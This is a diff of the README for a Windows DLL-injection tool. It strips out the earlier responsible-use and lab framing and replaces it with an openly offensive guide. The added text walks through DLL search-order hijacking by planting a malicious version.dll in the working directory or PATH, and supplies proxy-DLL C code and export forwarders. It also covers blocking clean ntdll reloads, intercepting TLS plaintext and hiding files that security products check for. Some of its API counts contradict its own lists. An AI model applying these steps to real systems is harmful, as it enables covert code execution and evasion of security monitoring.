@@ -1,476 +1,302 @@
 # FileBlinder
 
-
-**FileBlinder** is a Windows process instrumentation and file-access manipulation toolkit for authorized red-team labs, malware-analysis simulations, application resilience testing, and defensive detection engineering.
-
-It injects a user-mode DLL into a target process and selectively changes how that process sees specific files, DLLs, and runtime resources. This allows researchers to study Windows loader behavior, file-access assumptions, process-child propagation, user-mode API hooking, and anti-evasion behavior around `ntdll.dll`.
-
 ![FileBlinder banner](banner.png)
-> FileBlinder is intended for controlled environments where you own the system, have explicit authorization, or are conducting internal security validation.
 
----
-
-
-
-## Responsible Use Disclaimer
-
-FileBlinder is dual-use security tooling.
-
-It can be used by defenders, researchers, and red teams to understand how Windows applications behave when file access is manipulated inside a process. However, the same concepts can be misused if applied to systems without permission.
-
-By using this project, you agree that:
-
-- You will only use it on systems you own or are explicitly authorized to test.
-- You will not use it to hide malware, bypass security controls, steal data, or maintain unauthorized access.
-- You are responsible for complying with applicable laws, contracts, policies, and rules of engagement.
-- The authors and contributors are not responsible for misuse, damage, data loss, or legal consequences caused by unauthorized use.
-
-Use FileBlinder for research, validation, education, and defensive improvement.
-
----
-
-## Key Capabilities
-
-FileBlinder can:
-
-- Inject into an existing Windows process
-- Spawn a new process in a suspended state, inject, then resume it
-- Hide selected file paths from the injected process
-- Simulate missing DLLs, configuration files, plugins, or runtime resources
-- Study DLL search-order behavior
-- Test application behavior when expected files disappear
-- Propagate instrumentation into child processes
-- Intercept attempts to read a clean `ntdll.dll`
-- Protect the hooked `ntdll.dll` view inside the instrumented process
-- Capture telemetry from selected file, process, DLL-loading, HTTP, TLS, and socket APIs
-
----
-
-## Example Research Scenarios
-
-FileBlinder is not limited to DLL search-order hijacking. It can be used in multiple authorized research and engineering workflows.
-
----
-
-### 1. DLL Search-Order Research
-
-Windows applications sometimes load DLLs by name instead of using a full absolute path.
-
-Example:
-
-```c
-LoadLibraryW(L"version.dll");
-```
-
-When this happens, Windows searches several locations in order. FileBlinder can make a specific DLL appear missing to the target process, allowing researchers to observe how the loader behaves when the expected DLL cannot be found.
-
-Useful for:
-
-- Studying unsafe DLL loading behavior
-- Testing whether applications resolve DLLs from unexpected paths
-- Reproducing DLL search-order issues in a controlled lab
-- Validating detections for suspicious DLL resolution
-- Understanding how applications behave when system DLL access fails
-
-Example:
-
-```powershell
-.\file_blinder_injector.exe --spawn notepad.exe --block "C:\Windows\System32\version.dll"
-```
-
----
-
-### 2. Application Resilience Testing
-
-Applications often assume that configuration files, plugins, databases, cache files, or runtime resources always exist.
-
-FileBlinder can simulate missing files without deleting or modifying anything on disk.
-
-Useful for testing:
-
-- Missing configuration files
-- Missing plugins or modules
-- Missing license files
-- Missing cache files
-- Missing update metadata
-- Broken installer or updater assumptions
-- Graceful error handling
-
-Example:
-
-```powershell
-.\file_blinder_injector.exe --spawn app.exe --block "C:\ProgramData\Vendor\App\config.json"
-```
-
-The file remains present on disk, but the instrumented process sees it as missing.
-
----
-
-### 3. Security Detection Engineering
-
-Blue teams and detection engineers can use FileBlinder to generate controlled telemetry for suspicious file-access and DLL-loading patterns.
-
-Useful for validating detections around:
-
-- Unusual DLL search behavior
-- Repeated `NAME NOT FOUND` events before DLL loading
-- User-writable directories involved in DLL resolution
-- Unexpected file-access failures
-- Child-process inheritance of suspicious behavior
-- Attempts to read or remap `ntdll.dll`
-
-Example:
-
-```powershell
-.\file_blinder_injector.exe --spawn target.exe --block "C:\Windows\System32\example.dll" --child
-```
-
-The `--child` option is useful when testing applications that spawn helpers, plugin hosts, crash handlers, or updater processes.
-
----
-
-### 4. Malware-Analysis Simulation
-
-In a malware-analysis lab, FileBlinder can simulate process-local file hiding and anti-evasion behaviors without using live malware.
-
-Useful for:
-
-- Training analysts
-- Testing sandbox visibility
-- Testing EDR behavior
-- Generating controlled telemetry
-- Studying user-mode hook visibility
-- Observing process behavior under manipulated file-access conditions
-
-Example:
-
-```powershell
-.\file_blinder_injector.exe --pid 3660 --block "C:\Path\To\watched_file.dat"
-```
-
----
-
-### 5. Anti-Evasion Research Around `ntdll.dll`
-
-Many offensive tools and malware families attempt to read a clean copy of `ntdll.dll` from disk or from `KnownDlls` to bypass user-mode hooks.
-
-FileBlinder can intercept some of these attempts inside the instrumented process and return the already-hooked in-memory view instead.
-
-Research areas:
-
-- Clean `ntdll.dll` reload attempts
-- `KnownDlls` access behavior
-- Image-section mapping behavior
-- Hook visibility
-- User-mode hook bypass attempts
-- Process-local memory protection assumptions
-
----
-
-### 6. Child Process Instrumentation
-
-Many applications spawn helper processes, update processes, plugin hosts, crash reporters, or background workers.
-
-FileBlinder can optionally inject into child processes so the same instrumentation follows the process tree.
-
-Useful for:
-
-- Multi-process application analysis
-- Browser helper-process testing
-- Updater behavior research
-- Parent-child telemetry validation
-- Process-tree behavior simulation
-
-Example:
-
-```powershell
-.\file_blinder_injector.exe --spawn app.exe --block "C:\Path\To\File.dll" --child
-```
-
----
+A Windows DLL injection tool for red team operations. Blocks files from being read by an injected process and prevents the process from loading a clean copy of ntdll. Used to abuse Windows DLL search order hijacking by hiding DLLs in system/admin paths, forcing the loader to fall back to user-controlled directories where you plant a malicious payload.
 
 ## Build
 
-### Windows PowerShell
-
-```powershell
-.\build.ps1
+```
+.\build.ps1        # Windows PowerShell
+build.bat          # Windows CMD
+./build.sh         # Linux / cross-compile
 ```
 
-### Windows CMD
+Or build manually:
 
-```cmd
-build.bat
+```
+cargo build --release
+cargo build --release
 ```
 
-### Linux / Cross-Compile
-
-```bash
-./build.sh
-```
-
-### Manual Build
-
-```bash
-cargo build --release --manifest-path file_blinder_dll\Cargo.toml
-cargo build --release --manifest-path file_blinder_injector\Cargo.toml
-```
-
-Build outputs:
-
-```text
-file_blinder_dll.dll
-file_blinder_injector.exe
-```
-
-The build scripts copy the final binaries to the project root.
-
----
+Outputs: `file_blinder_dll.dll`, `file_blinder_injector.exe` (copied to root by build scripts)
 
 ## Usage
 
-```powershell
+```
 file_blinder_injector.exe --pid <PID> [--dll <DllPath>] [--block <Path>] [--child]
-
 file_blinder_injector.exe --spawn <ExePath> [--dll <DllPath>] [--block <Path>] [--child] [--cmdline <args>]
 ```
 
----
-
-## Options
-
-| Flag | Description |
-|---|---|
+| Flag | Purpose |
+|------|---------|
 | `--pid <pid>` | Inject into an existing process |
-| `--spawn <exe>` | Start a process suspended, inject FileBlinder, then resume it |
-| `--dll <path>` | Path to `file_blinder_dll.dll`; defaults to `.\file_blinder_dll.dll` |
-| `--block <path>` | File path that should appear missing to the target process |
-| `--child` | Also inject into child processes created by the target |
-| `--cmdline <args>` | Command-line arguments for the spawned process; used with `--spawn` |
+| `--spawn <exe>` | Create target process suspended, inject, then resume |
+| `--dll <path>` | Path to `file_blinder_dll.dll` (default: `.\file_blinder_dll.dll`) |
+| `--block <path>` | Hide a file path from the target — it will appear to not exist |
+| `--child` | Recursively inject into child processes spawned by the target |
+| `--cmdline <args>` | Command-line arguments for the spawned process (`--spawn` only) |
 
----
-
-## Basic Examples
-
-Inject into a running process:
+### Examples
 
 ```powershell
+# Inject into running process with default DLL
 .\file_blinder_injector.exe --pid 3660
+
+# Inject with custom DLL and file blocking
+.\file_blinder_injector.exe --pid 3660 --dll .\payload.dll --block "C:\Windows\System32\version.dll"
+
+# Spawn target, block DLL, child injection — all with default DLL
+.\file_blinder_injector.exe --spawn notepad.exe --block "C:\Windows\System32\version.dll" --child
 ```
 
-Inject into a running process and hide a file:
+This makes `C:\Windows\System32\version.dll` invisible to notepad.exe. When notepad (or any application it spawns) tries to load `version.dll`, the loader skips `System32`, falls past the other protected directories, and eventually reaches the current working directory — where you have planted a malicious `version.dll`.
+
+## DLL Search Order Hijacking
+
+### How Windows Finds DLLs
+
+When a process calls `LoadLibrary("foo.dll")` without a full path, Windows searches these locations **in order**:
+
+| Priority | Location | Default |
+|----------|----------|---------|
+| 1 | Known DLLs | System-cached (ntdll, kernel32, etc.) |
+| 2 | Application directory | The `.exe`'s folder |
+| 3 | System directory | `C:\Windows\System32` |
+| 4 | 16-bit system directory | `C:\Windows\System` |
+| 5 | Windows directory | `C:\Windows` |
+| 6 | Current directory | The process's CWD |
+| 7 | PATH directories | Every entry in `%PATH%` |
+
+If a DLL exists in a higher-priority location, the lower ones are never consulted. This is what makes hijacking possible.
+
+### The Attack
+
+For a DLL that normally resides in `System32`:
+
+```
+Normal load:  App dir → [not found] → System32 → [found, load the real one]
+```
+
+With FileBlinder:
+
+```
+Blinded load: App dir → [UNWRITABLE, skip] → System32 → [BLOCKED, appears missing]
+              → System → [UNWRITABLE, skip] → Windows → [UNWRITABLE, skip]
+              → CWD → [your malicious DLL loads]
+```
+
+The application directory, System32, and Windows directory are all protected. You can't write to any of them. But you don't need to. After blocking the legitimate DLL in System32, the loader falls through all the unwritable directories and finds the first writable location — the current working directory — where you've planted your payload.
+
+### Why This Works
+
+`C:\Windows\System32`, the application directory (usually `C:\Program Files\*`), and `C:\Windows` are all protected by UAC and TrustedInstaller — you can't write to or modify files in any of them. But you don't need to. FileBlinder hooks 18 file APIs at runtime inside the target process, returning `FILE_NOT_FOUND` for any blocked path. The NT kernel never sees the denial — it happens entirely in user mode, inside the process.
+
+### Planting the Malicious DLL
+
+You cannot write to `System32`, the application directory, or `C:\Windows`. All of these are protected by UAC, TrustedInstaller, or both. The attack works through the **current working directory** or **PATH** — both of which you can control without touching protected folders.
+
+**CWD attack:**
+
+```
+1. Create a controlled folder: C:\Users\Public\payload\
+2. Drop your malicious version.dll there
+3. Launch or inject the target with CWD set to C:\Users\Public\payload\
+4. Inject FileBlinder with --block "C:\Windows\System32\version.dll"
+5. target.exe calls LoadLibrary("version.dll") →
+   App dir → System32 → System → Windows → CWD → [your payload loads]
+```
+
+You can set the target's working directory via the parent process, a LNK shortcut, or the `--spawn` flag (the spawned process inherits the current working directory).
+
+**PATH attack:**
+
+```
+1. Create a controlled folder: C:\Users\Public\payload\
+2. Drop your malicious DLL there
+3. Prepend C:\Users\Public\payload\ to the target's PATH
+4. Inject FileBlinder with --block "C:\Windows\System32\version.dll"
+5. target.exe calls LoadLibrary("version.dll") →
+   Falls through all folders → hits PATH entry → [your payload loads]
+```
+
+The PATH attack is useful when you cannot control the target's CWD — for example, services or scheduled tasks that set their own working directory.
+
+### Which DLLs Can You Hijack?
+
+Any DLL that the target loads via `LoadLibrary`, delay-load, or COM activation without a full path. Common targets:
+
+- `version.dll` — loaded by most GUI applications for version resource APIs
+- `dwmapi.dll` — loaded by many graphics-heavy applications
+- `propsys.dll` — loaded by Explorer and shell extensions
+- `bcrypt.dll` — loaded by many updaters and installers
+- `cryptbase.dll` — loaded by applications using DPAPI
+- `textshaping.dll` — loaded by modern Chromium-based apps
+
+Use [ProcMon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) to discover what DLLs a target loads. Filter for `Operation: CreateFile` and `Path: ends with .dll` with `Result: NAME NOT FOUND` — these are the DLLs the application searches for in non-system paths and are prime hijack candidates.
+
+### Advanced: DLL Proxying
+
+When you replace a DLL, your payload must export the same functions the real DLL provides, otherwise the application crashes. Forward the calls to the original DLL.
+
+**Important:** Your proxy DLL runs inside the same injected process, so FileBlinder's hooks also apply to it. Calling `LoadLibrary("C:\Windows\System32\version.dll")` from your proxy will fail — that path is blocked. Instead, save a renamed copy of the original DLL to your controlled folder and forward to that:
+
+```
+1. Copy C:\Windows\System32\version.dll → C:\Users\Public\payload\version_orig.dll
+2. Your malicious version.dll forwards exports to version_orig.dll (not the System32 path)
+3. version_orig.dll is at an unblocked path → loads normally
+```
+
+#### Method 1: Linker forwarders (simplest, no C code)
+
+Dump the real DLL's exports, generate a `.def` with linker forwarder directives, and compile an empty DLL:
 
 ```powershell
-.\file_blinder_injector.exe --pid 3660 --block "C:\Path\To\file.txt"
+# Step 1: Dump exports from the real DLL
+dumpbin /EXPORTS C:\Windows\System32\version.dll
+
+# Step 2: Build version.def — each export forwarded to the renamed copy
+#         (dumpbin shows ordinals and names; convert to this format)
 ```
 
-Spawn a target process and hide a DLL:
-
-```powershell
-.\file_blinder_injector.exe --spawn notepad.exe --block "C:\Windows\System32\version.dll"
+```def
+; version.def — linker forwarders, no C code needed
+EXPORTS
+  GetFileVersionInfoExW      = version_orig.GetFileVersionInfoExW
+  GetFileVersionInfoSizeExW  = version_orig.GetFileVersionInfoSizeExW
+  GetFileVersionInfoSizeW    = version_orig.GetFileVersionInfoSizeW
+  GetFileVersionInfoW        = version_orig.GetFileVersionInfoW
+  VerFindFileA               = version_orig.VerFindFileA
+  VerFindFileW               = version_orig.VerFindFileW
+  VerInstallFileA            = version_orig.VerInstallFileA
+  VerInstallFileW            = version_orig.VerInstallFileW
+  VerLanguageNameA           = version_orig.VerLanguageNameA
+  VerLanguageNameW           = version_orig.VerLanguageNameW
+  VerQueryValueA             = version_orig.VerQueryValueA
+  VerQueryValueW             = version_orig.VerQueryValueW
 ```
 
-Spawn a process, hide a file, and instrument child processes:
-
-```powershell
-.\file_blinder_injector.exe --spawn app.exe --block "C:\ProgramData\App\config.json" --child
+```
+# Step 3: Compile
+cl /LD /DEF:version.def /Fe:version.dll empty.c
 ```
 
-Pass command-line arguments to a spawned process:
+The linker resolves each forward at load time — no stub code required. When the target calls `GetFileVersionInfoW`, the loader follows the forwarder chain to `version_orig.dll` automatically.
 
-```powershell
-.\file_blinder_injector.exe --spawn app.exe --cmdline "--debug --profile test" --block "C:\Path\To\file.dat"
+#### Method 2: C proxy with macros (when you need custom logic)
+
+Use this when you need to log calls, modify parameters, or inject behavior before forwarding:
+
+```c
+// proxy.c
+// Build: cl /LD /DEF:version.def proxy.c /Fe:version.dll
+
+#include <windows.h>
+
+static HMODULE hOriginal = NULL;
+
+BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        // Load renamed copy — NOT the blocked System32 path
+        hOriginal = LoadLibraryW(L"version_orig.dll");
+        if (!hOriginal) return FALSE;
+    }
+    return TRUE;
+}
+
+// Macro: generate a forwarder stub for each export
+#define FORWARD(ret, name, ...)                         \
+    typedef ret (WINAPI *fn_##name)(__VA_ARGS__);       \
+    ret WINAPI name(__VA_ARGS__) {                       \
+        fn_##name p = (fn_##name)GetProcAddress(hOriginal, #name); \
+        return p ? p(__VA_ARGS__) : (ret)0;              \
+    }
+
+// version.dll exports
+FORWARD(BOOL,   GetFileVersionInfoExW,     LPCWSTR, DWORD, LPVOID, DWORD)
+FORWARD(BOOL,   GetFileVersionInfoSizeExW, LPCWSTR, DWORD, LPDWORD)
+FORWARD(BOOL,   GetFileVersionInfoSizeW,   LPCWSTR, LPDWORD)
+FORWARD(BOOL,   GetFileVersionInfoW,       LPCWSTR, DWORD, DWORD, LPVOID)
+FORWARD(DWORD,  VerFindFileA,              DWORD, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT, LPSTR, PUINT)
+FORWARD(DWORD,  VerFindFileW,              DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT, LPWSTR, PUINT)
+FORWARD(DWORD,  VerInstallFileA,           DWORD, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT)
+FORWARD(DWORD,  VerInstallFileW,           DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT)
+FORWARD(BOOL,   VerLanguageNameA,          DWORD, DWORD, LPCSTR, PUINT, PUINT, PUINT, LPCSTR, PUINT)
+FORWARD(BOOL,   VerLanguageNameW,          DWORD, DWORD, LPCWSTR, PUINT, PUINT, PUINT, LPWSTR, PUINT)
+FORWARD(BOOL,   VerQueryValueA,            LPCVOID, LPCSTR, LPVOID*, PUINT)
+FORWARD(BOOL,   VerQueryValueW,            LPCVOID, LPCWSTR, LPVOID*, PUINT)
 ```
 
----
+```def
+; version.def — export the proxy stubs (not forwarders this time)
+EXPORTS
+  GetFileVersionInfoExW
+  GetFileVersionInfoSizeExW
+  GetFileVersionInfoSizeW
+  GetFileVersionInfoW
+  VerFindFileA
+  VerFindFileW
+  VerInstallFileA
+  VerInstallFileW
+  VerLanguageNameA
+  VerLanguageNameW
+  VerQueryValueA
+  VerQueryValueW
+```
+
+## Beyond Hijacking: General File Hiding
+
+FileBlinder blocks **any** file path, not just DLLs. Use it to:
+
+- Hide config files loaded by the target
+- Hide license/registration check files
+- Block log files from being written (the target thinks writes succeeded)
+- Suppress detection files that security products check for
+
+## ntdll Protection
+
+Once injected, FileBlinder snapshots the in-memory ntdll.dll (already patched by its own hooks) and protects it from being evaded:
+
+### Read Interception
+
+Any attempt by the infected process to read a fresh ntdll from disk is intercepted:
+
+| Attack | Defense |
+|--------|---------|
+| `NtReadFile` / `ReadFile` on `C:\Windows\System32\ntdll.dll` | Returns the hooked in-memory copy, not the clean on-disk version |
+| `NtReadFileScatter` | Same — scatter/gather reads return hooked bytes |
+| `NtCreateSection(SEC_IMAGE)` from ntdll file handle | Redirected to a pagefile-backed section filled with the hooked copy |
+| `NtOpenSection("\KnownDlls\ntdll.dll")` | Blocked with `STATUS_ACCESS_DENIED` |
+| `CopyFile` to copy ntdll elsewhere then read it | Copy writes the hooked bytes (read interception fires during copy) |
+
+### Write Protection
+
+External processes cannot overwrite the hooked ntdll pages:
+
+| Attack | Defense |
+|--------|---------|
+| `NtWriteVirtualMemory` / `WriteProcessMemory` to ntdll range | Returns success without writing |
+| `NtProtectVirtualMemory` to make ntdll writable | Silently blocked |
+| `NtMapViewOfSection` mapping over ntdll range | Blocked with `STATUS_CONFLICTING_ADDRESSES` |
+| `NtUnmapViewOfSection` on ntdll base | Silently blocked |
+| Direct `mov` after making pages writable | Prevented by blocking NtProtectVirtualMemory |
+
+### Limitations
+
+The write protection only applies to processes that have FileBlinder injected. An external process without the DLL can still call `WriteProcessMemory` on the target to overwrite ntdll. To fully prevent this, protect the ntdll pages at the OS level (e.g., via VBS enclave or kernel driver).
 
 ## How It Works
 
-FileBlinder injects a DLL into the target process and installs user-mode API hooks using MinHook.
+FileBlinder uses [MinHook](https://github.com/TsudaKageyu/minhook) to install inline detours on 32 NT/Win32 API functions:
 
-When the target process tries to access a configured blocked path, FileBlinder makes that path appear unavailable to the process. The file is not deleted, modified, or hidden globally. The behavior only applies inside the instrumented process.
+| Category | Functions Hooked | Purpose |
+|----------|-----------------|---------|
+| File hiding (18) | `NtOpenFile`, `NtCreateFile`, `NtQueryAttributesFile`, `NtQueryFullAttributesFile`, `GetFileAttributesW`, `GetFileAttributesExW`, `CreateFileW`, `FindFirstFileW`, `FindFirstFileExW`, `SearchPathW`, `LoadLibraryW`, `LoadLibraryExW`, `PathFileExistsW`, `_waccess`, `_wstat64`, `_wfopen` | Make blocked paths invisible |
+| ntdll protection (8) | `NtReadFile`, `NtReadFileScatter`, `NtCreateSection`, `NtOpenSection`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtMapViewOfSection`, `NtUnmapViewOfSection` | Intercept disk reads of ntdll, protect memory |
+| Process spawn (1) | `CreateProcessInternalW` | Child injection + telemetry |
+| DLL load (1) | `LdrLoadDll` | Telemetry |
+| TLS capture (3) | `EncryptMessage`, `DecryptMessage`, `InitializeSecurityContextW` | TLS plaintext interception |
+| HTTP capture (7) | `WinHttpSendRequest`, `WinHttpWriteData`, `WinHttpReadData`, `HttpSendRequestW`, `HttpSendRequestA`, `InternetReadFile`, `InternetWriteFile` | HTTP/S plaintext |
+| Socket capture (4) | `send`, `recv`, `WSASend`, `WSARecv` | Raw socket data |
 
-The blocked path configuration is stored at:
-
-```text
-C:\Users\Public\file_blinder_block.cfg
-```
-
-Child-injection behavior is configured through:
-
-```text
-C:\Users\Public\file_blinder_child.cfg
-```
-
----
-
-## Hooked API Categories
-
-FileBlinder hooks APIs across several categories.
-
-| Category | Purpose |
-|---|---|
-| File visibility | Make selected paths appear missing |
-| DLL loading | Observe and influence DLL-resolution behavior |
-| Process creation | Support child-process instrumentation |
-| `ntdll.dll` read protection | Intercept attempts to read a clean disk copy of `ntdll.dll` |
-| Memory protection | Reduce simple in-process attempts to overwrite hooked pages |
-| HTTP/TLS/socket APIs | Capture lab telemetry from instrumented processes |
-
----
-
-## File Visibility Hooks
-
-FileBlinder intercepts common file and path APIs, including:
-
-```text
-NtOpenFile
-NtCreateFile
-NtQueryAttributesFile
-NtQueryFullAttributesFile
-GetFileAttributesW
-GetFileAttributesExW
-CreateFileW
-FindFirstFileW
-FindFirstFileExW
-SearchPathW
-LoadLibraryW
-LoadLibraryExW
-PathFileExistsW
-_waccess
-_wstat64
-_wfopen
-```
-
-When a blocked path is requested, the target process receives a result equivalent to the file not existing.
-
----
-
-## DLL Search-Order Research
-
-When an application calls:
-
-```c
-LoadLibraryW(L"example.dll");
-```
-
-without a fully qualified path, Windows searches multiple locations in order.
-
-Typical locations include:
-
-1. Known DLLs
-2. Application directory
-3. System directory
-4. Windows directory
-5. Current working directory
-6. Directories in `%PATH%`
-
-If a DLL is found in a higher-priority location, lower-priority locations are not normally checked.
-
-FileBlinder can make a selected DLL appear missing to the target process, allowing researchers to observe fallback behavior in a controlled lab.
-
-Example:
-
-```powershell
-.\file_blinder_injector.exe --spawn target.exe --block "C:\Windows\System32\version.dll"
-```
-
-This is useful for studying whether the application safely loads DLLs or whether it may resolve DLLs from unexpected locations.
-
----
-
-## `ntdll.dll` Protection Research
-
-After injection, FileBlinder snapshots the in-memory `ntdll.dll` view and attempts to prevent the instrumented process from loading or reading a clean copy from disk.
-
-This is useful for studying common user-mode hook bypass behavior.
-
-Examples of intercepted behavior include:
-
-| Behavior | FileBlinder Response |
-|---|---|
-| Reading `C:\Windows\System32\ntdll.dll` | Returns the hooked in-memory copy |
-| Opening `\KnownDlls\ntdll.dll` | Blocks access |
-| Creating an image section from `ntdll.dll` | Redirects to a controlled section |
-| Attempting to overwrite hooked `ntdll.dll` pages | Blocks or neutralizes the write inside the instrumented process |
-
----
-
-## Network and Plaintext Telemetry
-
-FileBlinder can hook selected HTTP, TLS, and socket APIs to collect lab telemetry from the instrumented process.
-
-Hook categories include:
-
-```text
-EncryptMessage
-DecryptMessage
-InitializeSecurityContextW
-
-WinHttpSendRequest
-WinHttpWriteData
-WinHttpReadData
-
-HttpSendRequestW
-HttpSendRequestA
-
-InternetReadFile
-InternetWriteFile
-
-send
-recv
-WSASend
-WSARecv
-```
-
-This is useful for controlled research and visibility testing inside lab environments.
-
----
-
-## Limitations
-
-FileBlinder is a user-mode instrumentation tool. It is not a kernel security boundary.
-
-Important limitations:
-
-- It only affects processes where the FileBlinder DLL is injected.
-- It does not globally hide files from the operating system.
-- It does not protect against all external process tampering.
-- Kernel-mode components or privileged tools may bypass user-mode hooks.
-- Some applications may crash if expected DLL exports or files are missing.
-- EDRs, AVs, or system hardening tools may detect or block injection behavior.
-- Behavior may vary across Windows versions and process architectures.
-
-For stronger memory protection or tamper resistance, kernel-mode enforcement or platform security features are required.
-
----
-
-## Recommended Lab Workflow
-
-1. Use a disposable virtual machine.
-2. Take a snapshot before testing.
-3. Pick a known target process.
-4. Choose one file or DLL path to block.
-5. Run FileBlinder with `--spawn` or `--pid`.
-6. Observe behavior using Process Monitor, ETW, Sysmon, EDR telemetry, or custom logging.
-7. Revert the VM snapshot after testing.
-
----
-
-## Safety Notes
-
-- Do not test on production systems unless explicitly authorized.
-- Do not inject into security-sensitive or critical business processes unless your rules of engagement allow it.
-- Do not use this tool to conceal unauthorized payloads or bypass security monitoring.
-- Prefer isolated lab machines, snapshots, and disposable test data.
-- Document your test scope before running experiments.
-
----
-
-## Project Status
-
-FileBlinder is experimental research tooling.
-
-Expect rough edges, version-specific behavior, and possible crashes in some target processes. Contributions, bug reports, and defensive research feedback are welcome.
-
----
+Config is read from `C:\Users\Public\file_blinder_block.cfg` (blocked path) and `C:\Users\Public\file_blinder_child.cfg` (child injection flag).
